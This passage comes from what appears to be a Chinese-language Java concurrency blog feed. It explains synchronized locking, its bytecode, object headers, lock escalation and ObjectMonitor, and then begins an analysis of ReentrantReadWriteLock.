<h4 id="使用当前实例对象充当锁"><a href="#使用当前实例对象充当锁" class="headerlink" title="使用当前实例对象充当锁"></a>使用当前实例对象充当锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SynchronizedTest st = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(st);</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用类对象充当锁"><a href="#使用类对象充当锁" class="headerlink" title="使用类对象充当锁"></a>使用类对象充当锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span>(SynchronizedTest<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">			addOne();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		Thread t2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SynchronizedTest());</span><br><span class="line">		</span><br><span class="line">		t1.start();</span><br><span class="line">		t2.start();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			t1.join();</span><br><span class="line">			t2.join();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面两段代码块的运行结果是一致的，都是20000.</p>
<h2 id="synchronized关键字的原理"><a href="#synchronized关键字的原理" class="headerlink" title="synchronized关键字的原理"></a>synchronized关键字的原理</h2><p>我们先把synchronized关键字修饰的相关代码反编译一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SynchronizedTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Start "</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">staticMethod</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"静态同步方法开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">"静态同步方法结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法2开始"</span>);</span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        System.out.println(<span class="string">"实例同步方法2结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> SynchronizedTest synDemo = <span class="keyword">new</span> SynchronizedTest();</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               synDemo.method();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                synDemo.method2();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先将上述源文件编译为.class文件，执行命令 <strong>javac SynchronizedTest.java</strong>即可。获取到SynchronizedTest.class字节码文件之后，再执行<strong>javap -v SynchronizedTest</strong>命令，反编译字节码文件，得到如下内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addOne</span><span class="params">()</span></span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">2</span>, args_size=<span class="number">1</span></span><br><span class="line">         0: getstatic     #20                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">         3: ldc           #26                 // String Start</span><br><span class="line">         5: invokevirtual #28                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">         <span class="number">8</span>: aload_0</span><br><span class="line">         <span class="number">9</span>: dup</span><br><span class="line">        <span class="number">10</span>: astore_1</span><br><span class="line">        <span class="number">11</span>: monitorenter</span><br><span class="line">        12: getstatic     #10                 // Field i:I</span><br><span class="line">        <span class="number">15</span>: iconst_1</span><br><span class="line">        <span class="number">16</span>: iadd</span><br><span class="line">        17: putstatic     #10                 // Field i:I</span><br><span class="line">        <span class="number">20</span>: aload_1</span><br><span class="line">        <span class="number">21</span>: monitorexit</span><br><span class="line">        <span class="number">22</span>: goto          <span class="number">28</span></span><br><span class="line">        <span class="number">25</span>: aload_1</span><br><span class="line">        <span class="number">26</span>: monitorexit</span><br><span class="line">        <span class="number">27</span>: athrow</span><br><span class="line">        <span class="number">28</span>: <span class="keyword">return</span>  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">staticMethod</span><span class="params">()</span> <span class="keyword">throws</span> java.lang.InterruptedException</span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC, ACC_SYNCHRONIZED</span><br><span class="line">    Exceptions:</span><br><span class="line">      <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> <span class="keyword">throws</span> java.lang.InterruptedException</span>;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_SYNCHRONIZED</span><br><span class="line">    Exceptions:</span><br><span class="line">      <span class="keyword">throws</span> java.lang.InterruptedException</span><br></pre></td></tr></table></figure>

<p>从上面反编译的内容可以发现，同步方法都会有一个ACC_SYNCHRONIZED的flag.而synchronized修饰的代码块反编译出来的指令中多了两条monitorenter和monitorexit指令。它们作用是进入和退出管程，Java虚拟机就是靠管程对象，实现同步的。</p>
<p>使用java虚拟机规范中的一句话来解释可能更加浅显易懂</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Synchronization in the Java Virtual Machine is implemented by monitor entry and exit, either explicitly (by use of the monitorenter and monitorexit instructions) or implicitly (by the method invocation and return instructions). For code written in the Java programming language, perhaps the most common form of synchronization is the synchronized method. A synchronized method is not normally implemented using monitorenter and monitorexit. Rather, it is simply distinguished in the run-time constant pool by the ACC_SYNCHRONIZED flag, which is checked by the method invocation instructions (§2.11.10).</span><br></pre></td></tr></table></figure>

<p>大意就是</p>
<ul>
<li>在Java虚拟机中，同步的实现是通过管程的进入和退出实现的。要么显式地通过monitorenter和monitorexit指令实现，要么隐式地通过方法调用和返回指令实现。</li>
<li>对于Java代码来说，最常用的同步实现就是同步方法。其中同步代码块是通过使用monitorenter和monitorexit实现的，而同步方法确实使用ACC_SYNCHRONIZED标记符隐式地实现，原理是通过方法调用指令检查该方法在常量池中是否包含ACC_SYNCHRONIZED标记符。</li>
</ul>
<p>如果有设置该值，则需要先获取管程的锁，然后开始执行方法，方法执行之后在释放管程的锁，这时候如果其他线程来请求执行该方法，会因无法获得管程锁而被阻塞住。值得注意的是，如果在方法执行过程中，发生了异常，并且方法内部并没有处理该异常，那么在异常跑到方法外面之后，管程的锁将会被<strong>自动释放</strong>。</p>
<h3 id="monitorenter"><a href="#monitorenter" class="headerlink" title="monitorenter"></a>monitorenter</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Each object is associated with a monitor. A monitor is locked if and only if it has an owner. The thread that executes monitorenter attempts to gain ownership of the monitor associated with objectref, as follows:</span><br><span class="line">	If the entry count of the monitor associated with objectref is zero, the thread enters the monitor and sets its entry count to one. The thread is then the owner of the monitor.</span><br><span class="line"></span><br><span class="line">	If the thread already owns the monitor associated with objectref, it reenters the monitor, incrementing its entry count.</span><br><span class="line"></span><br><span class="line">	If another thread already owns the monitor associated with objectref, the thread blocks until the monitor’s entry count is zero, then tries again to gain ownership.</span><br></pre></td></tr></table></figure>

<p>大意是：每个对象都关联了一个管程。一个管程如果已经拥有了一个所有者，那么就被视为锁住了。以下是三种线程执行指令monitorenter来获取对象的管程拥有权的场景及其结果。</p>
<ul>
<li>对象关联的管程引用计数是0，那么当前线程获取该管程的所有权，并将计数设置为1</li>
<li>如果当前线程已经是该管程的所有者，那么重新进入管程，并将计数自增1</li>
<li>如果其他线程已经拥有了某个对象的管程所有权（即管程引用计数不唯一，并且所有者为其他线程）。当前线程再去获取的话，就会阻塞，直到该管程的引用计数为0才可能获取到所有权。</li>
</ul>
<h3 id="monitorexit"><a href="#monitorexit" class="headerlink" title="monitorexit"></a>monitorexit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The thread that executes monitorexit must be the owner of the monitor associated with the instance referenced by objectref.</span><br><span class="line"></span><br><span class="line">The thread decrements the entry count of the monitor associated with objectref. If as a result the value of the entry count is zero, the thread exits the monitor and is no longer its owner. Other threads that are blocking to enter the monitor are allowed to attempt to do so.</span><br></pre></td></tr></table></figure>

<p>大意是：只有管程的所有者才可以执行monitorexit指令。当线程减少管程的引用计数直至0时，此线程就退出了管程，也就不再是该管程的所有者了。此时，其他被阻塞的线程就可以尝试着去获取这个管程了。</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitorenter.png" alt="monitorenter流程"></p>
<h2 id="Java对象头"><a href="#Java对象头" class="headerlink" title="Java对象头"></a>Java对象头</h2><p>在理解管程之前，需要了解一下Java的对象头相关知识。</p>
<p>Java对象保存在内存中，主要以以下三部分组成：</p>
<ul>
<li>对象头</li>
<li>实例数据</li>
<li>对齐填充数据</li>
</ul>
<h3 id="对象头"><a href="#对象头" class="headerlink" title="对象头"></a>对象头</h3><p>对象头由以下三个部分组成：</p>
<ul>
<li>Mark Word：用于存储对象自身运行时的数据，它是实现轻量级锁和偏向锁的关键</li>
<li>类型指针：是对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例</li>
<li>数组长度（如果是数组对象的话）</li>
</ul>
<h4 id="Mark-Word"><a href="#Mark-Word" class="headerlink" title="Mark Word"></a>Mark Word</h4><table>
<thead>
<tr>
<th>虚拟机位数</th>
<th>头对象结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>32/64位</td>
<td>Mark Word</td>
<td>存储对象自身的运行时数据，如hash码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。</td>
</tr>
</tbody></table>
<p>在32位的HotSpot虚拟机中，如果对象处于未被锁定的状态下，那么Mark Word的32bit空间里的25位用于存储对象哈希码，4bit用于存储对象分代年龄，2bit用于存储锁标志位，1bit固定为0，表示非偏向锁。其他状态如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-mark-word-detail.png" alt="Mark Word示例"></p>
<p>依据这张图，就可以更好地说明synchronized的锁升级流程了。众所周知，Java中锁升级是从无锁-&gt;偏向锁-&gt;轻量级锁-&gt;重量级锁，并且只能升级，不能降级。</p>
<p>下面就来结合mark word 来梳理下这个流程。</p>
<ol>
<li>当Mark Word 没有被当做是锁时，就是一个普通的对象，Mark Word记录对象的HashCode，锁标志位是01，是否为偏向锁那一位是0；</li>
<li>当对象被当做同步锁并有一个线程A抢到了锁时，锁的标志位还是01，但是否偏向锁那一位改成1，前23bit记录抢到锁的线程id，表示进入偏向锁状态；</li>
<li>当线程A再次试图来获取锁时，JVM发现同步锁对象的标志位是01，是否偏向锁是1，并且记录的线程id就是自己的id，那么线程A就继续执行同步的代码；</li>
<li>当线程B试图获取这个锁时，JVM发现同步锁处于偏向状态，但是Mark Word中记录的线程id不是B的id，那么线程B就会先尝试着用CAS操作获取锁。这里获取锁的操作是有可能成功的，因为线程A一般不会自动释放偏向锁。如果获取锁成功，就把Mark Word中的线程id改为线程B的id，代表线程B获得了这个偏向锁，可以执行同步代码。如果去获取锁失败，则执行步骤5；</li>
<li>偏向锁状态获取锁失败，代表当前锁存在一定的竞争，偏向锁将升级为轻量级锁。JVM会在线程B的线程栈中开辟一块独立的空间，里面保存指向对象所Mark Word的指针，同时在对象锁Mark Word中保存指向这片空间的指针。上述两个都是CAS操作，如果保存成功，代表线程B抢到了同步锁，就把Mark Word中的锁标志位改成00，可以执行同步锁代码。如果保存失败，表示抢锁失败，竞争太激烈，继续执行步骤6；</li>
<li>轻量级锁抢锁失败，JVM会使用自旋锁，自旋锁不是一个锁状态，只是代表不停地重试，尝试抢锁。从Java 1.7开始，自旋锁默认是启用的，自选次数由JVM决定（适应性自旋锁）。如果抢锁成功则执行同步锁代码，如果失败则继续执行步骤7；</li>
<li>自旋锁重试之后如果抢锁依然失败，同步锁会升级至重量级锁，锁标志位改为10，锁指针就指向monitor的起始地址。在这个状态下，未抢到锁的线程都会被阻塞。</li>
</ol>
<h3 id="实例数据"><a href="#实例数据" class="headerlink" title="实例数据"></a>实例数据</h3><p>对象的实例数据就是在java代码中能看到的属性和他们的值。</p>
<h3 id="对齐填充数据"><a href="#对齐填充数据" class="headerlink" title="对齐填充数据"></a>对齐填充数据</h3><p>因为JVM要求java的对象占的内存大小应该是8bit的倍数，所以后面有几个字节用于把对象的大小补齐至8bit的倍数，没有特别的功能。</p>
<h2 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h2><p>管程（monitor）可以被理解为是一种同步工具，或者是同步机制，它通常被描述为一个对象。操作系统的管程是概念原理，ObjectMonitor是它的原理实现。</p>
<h3 id="操作系统管程"><a href="#操作系统管程" class="headerlink" title="操作系统管程"></a>操作系统管程</h3><ul>
<li>管程是一种程序结构，结构内的多个子程序（对象或模块）形成的多个工作线程互斥访问共享资源。</li>
<li>这些共享资源一般是硬件设备或一群变量。管程实现了在一个时间点，最多只有一个线程在执行管程的某个子程序。</li>
<li>与那些通过修改数据结构实现互斥访问的并发程序设计相比，管程实现很大程度上简化了程序设计。</li>
<li>管程提供了一种机制，线程可以临时放弃互斥访问，等待某些条件得到满足后，重新获得执行权恢复它的互斥访问。</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor.png" alt="monitor"></p>
<h3 id="ObjectMonitor"><a href="#ObjectMonitor" class="headerlink" title="ObjectMonitor"></a>ObjectMonitor</h3><p>ObjectMonitor主要数据结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ObjectMonitor() &#123;</span><br><span class="line">    _header       = <span class="literal">NULL</span>;</span><br><span class="line">    _count        = <span class="number">0</span>; <span class="comment">//记录个数</span></span><br><span class="line">    _waiters      = <span class="number">0</span>,</span><br><span class="line">    _recursions   = <span class="number">0</span>;</span><br><span class="line">    _object       = <span class="literal">NULL</span>;</span><br><span class="line">    _owner        = <span class="literal">NULL</span>;</span><br><span class="line">    _WaitSet      = <span class="literal">NULL</span>; <span class="comment">//处于wait状态的线程，会被加入到_WaitSet</span></span><br><span class="line">    _WaitSetLock  = <span class="number">0</span> ;</span><br><span class="line">    _Responsible  = <span class="literal">NULL</span> ;</span><br><span class="line">    _succ         = <span class="literal">NULL</span> ;</span><br><span class="line">    _cxq          = <span class="literal">NULL</span> ;</span><br><span class="line">    FreeNext      = <span class="literal">NULL</span> ;</span><br><span class="line">    _EntryList    = <span class="literal">NULL</span> ; <span class="comment">//处于等待锁block状态的线程，会被加入到该列表</span></span><br><span class="line">    _SpinFreq     = <span class="number">0</span> ;</span><br><span class="line">    _SpinClock    = <span class="number">0</span> ;</span><br><span class="line">    OwnerIsThread = <span class="number">0</span> ;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ObjectMonitor主要字段释义如下：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor-keyword.png" alt="monitor"></p>
<p>ObjectMonitor中有两个队列，_WaitSet和_EntryList，用来保存ObjectWaiter对象列表（每个等待锁的线程都会被封装成ObjectWaiter对象），_owner指向持有ObjectMonitor对象的线程。</p>
<p>当多个线程同时访问一段同步代码时，首先会进入_EntryList，当线程获取到对象的monitor后，进入owner区域，并把monitor中的owner变量设置为当前线程，同时monitor中的计数器count自增1.</p>
<p>如果线程调用wait方法，将释放当前持有的monitor，owner变量恢复为null，计数器count自减1，同时该线程进入Waitset中等待被唤醒。</p>
<p>如果其他线程调用 notify() / notifyAll() ，会唤醒_WaitSet中的某个线程，该线程再次尝试获取monitor锁，成功即进入_Owner区域。</p>
<p>若当前线程也执行完毕，也会释放monitor并复位变量的值，以便其他线程进入获取monitor。如下图所示：</p>
<p><img src="https://huhansi.github.io/images/2020-03-11-monitor-flow.png" alt="monitor"></p>
<h2 id="对象与monitor关联"><a href="#对象与monitor关联" class="headerlink" title="对象与monitor关联"></a>对象与monitor关联</h2><p><img src="https://huhansi.github.io/images/2020-03-11-monitor-guanlian.png" alt="monitor"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/javazejian/article/details/72828483?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">深入理解Java并发之synchronized实现原理</a></p>
<p><a href="https://juejin.im/post/5d5374076fb9a06ac76da894" target="_blank" rel="noopener">Synchronized解析——如果你愿意一层一层剥开我的心</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
        <tag>synchronized</tag>
      </tags>
  </entry>
  <entry>
    <title>ReentrantReadWriteLock解析</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-06-ReentrantReadWriteLock%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ReentrantReadWriteLock解析"><a href="#ReentrantReadWriteLock解析" class="headerlink" title="ReentrantReadWriteLock解析"></a>ReentrantReadWriteLock解析</h1><p>前文提到的synchronized关键和和ReentrantLock，它们都是独占式锁，排他锁。在同一时刻只能有一个线程获取多。这个就非常不适合那种读多写少的场景。</p>
<p>如果有多个线程需要读取共享数据，极少数甚至只有一个线程写共享数据的话，就非常不划算了。读操作对数据没有影响，完全可以并发进行。</p>
<p>于是Java提供了另外一个实现了Lock接口的ReentrantReadWriteLock（可重入读写锁）。使用这个锁时，多个读线程可以在同一个时刻访问共享资源。但是在写线程访问的时候，所有的读线程和其他写线程都会被阻塞。</p>
<p>它还有以下特点：</p>
<ol>
<li>支持公平锁和非公平锁，默认非公平锁</li>
<li>可重入。不管是读锁还是写锁，线程在获取之后，还能再次获取。写锁在成功获取之后，也能获取读锁。</li>
<li>锁降级：遵循获取写锁，获取读锁，然后释放写锁的次序，写锁就能降级为读锁。</li>
</ol>
<h2 id="类结构"><a href="#类结构" class="headerlink" title="类结构"></a>类结构</h2><p>请见下图</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-ReentrantReadWriteLock.png" alt="ReentrantReadWriteLock类结构图"></p>
<p>在分别分析读写锁之前，我们看下读写锁在Sync中时怎么计数的。</p>
<p>在ReentrantReadWriteLock的内部抽象静态类中有这么几句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Read vs write count extraction constants and functions.</span></span><br><span class="line"><span class="comment">         * Lock state is logically divided into two unsigned shorts:</span></span><br><span class="line"><span class="comment">         * The lower one representing the exclusive (writer) lock hold count,</span></span><br><span class="line"><span class="comment">         * and the upper the shared (reader) hold count.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHARED_SHIFT   = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHARED_UNIT    = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_COUNT      = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EXCLUSIVE_MASK = (<span class="number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** Returns the number of shared holds represented in count  */</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sharedCount</span><span class="params">(<span class="keyword">int</span> c)</span>    </span>&#123; <span class="keyword">return</span> c &gt;&gt;&gt; SHARED_SHIFT; &#125;</span><br><span class="line">        <span class="comment">/** Returns the number of exclusive holds represented in count  */</span></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">exclusiveCount</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123; <span class="keyword">return</span> c &amp; EXCLUSIVE_MASK; &#125;</span><br></pre></td></tr></table></figure>

<p>其中方法sharedCount是用作获取读锁被获取的次数。它将同步状态c右移16位，取它的高16位。</p>
<p>方法exclusiveCount是用作获取写锁被获取的次数。EXCLUSIVE_MASK为1左移16位，然后减1，即为0x0000FFFF。然后和当前的同步状态C相与，获取同步状态的低16位。</p>
<p>示意图如下：</p>
<p><img src="https://huhansi.github.io/images/2020-03-12-state-bit.png" alt="同步状态高低位示意"></p>
<h2 id="写锁"><a href="#写锁" class="headerlink" title="写锁"></a>写锁</h2><h3 id="写锁的获取"><a href="#写锁的获取" class="headerlink" title="写锁的获取"></a>写锁的获取</h3><p>其他流程已经在AQS里面实现了，我们具体看一下写锁的tryAcquire方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Walkthrough:</span></span><br><span class="line"><span class="comment">             * 1. If read count nonzero or write count nonzero</span></span><br><span class="line"><span class="comment">             *    and owner is a different thread, fail.</span></span><br><span class="line"><span class="comment">             * 2. If count would saturate, fail. (This can only</span></span><br><span class="line"><span class="comment">             *    happen if count is already nonzero.)</span></span><br><span class="line"><span class="comment">             * 3. Otherwise, this thread is eligible for lock if</span></span><br><span class="line"><span class="comment">             *    it is either a reentrant acquire or</span></span><br><span class="line"><span class="comment">             *    queue policy allows it. If so, update state</span></span><br><span class="line"><span class="comment">             *    and set owner.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Thread current = Thread.currentThread();</span><br><span class="line">            <span class="keyword">int</span> c = getState();</span><br><span class="line">            <span class="keyword">int</span> w = exclusiveCount(c);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// (Note: if c != 0 and w == 0 then shared count != 0)</span></span><br><span class="line">                <span class="keyword">if</span> (w == <span class="number">0</span> || current != getExclusiveOwnerThread())</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Maximum lock count exceeded"</span>);</span><br><span class="line">                <span class="comment">// Reentrant acquire</span></span><br><span class="line">                setState(c + acquires);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (writerShouldBlock() ||</span><br><span class="line">                !compareAndSetState(c, c + acquires))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>大体流程是：</p>
<ol>
<li>如果同步状态c不为0，写锁被获取次数为0，说明此时有线程已经获取到了读锁，获取失败</li>
<li>亦或同步状态c不为0，当前线程不是获取写锁的线程，获取失败</li>
<li>亦或持有的写锁次数应超过最大可持有数目了。这里写锁只可有一个线程持有，但是可以重入MAX_COUNT次</li>
<li>如果上述情况均没有，则当前线程可获取写锁，设置同步状态，设置独占线程为线程本身</li>
</ol>
<p>注意到还有一个writerShouldBlock方法，这个方法在公平锁和非公平锁中的实现逻辑是不一样的。</p>
<p>在公平锁中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writerShouldBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> hasQueuedPredecessors();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>它是以队列里面是否有正在等候的线程来判断的。</p>
<p>而非公平锁中直接返回false，因为非公平锁是支持抢占的</p>
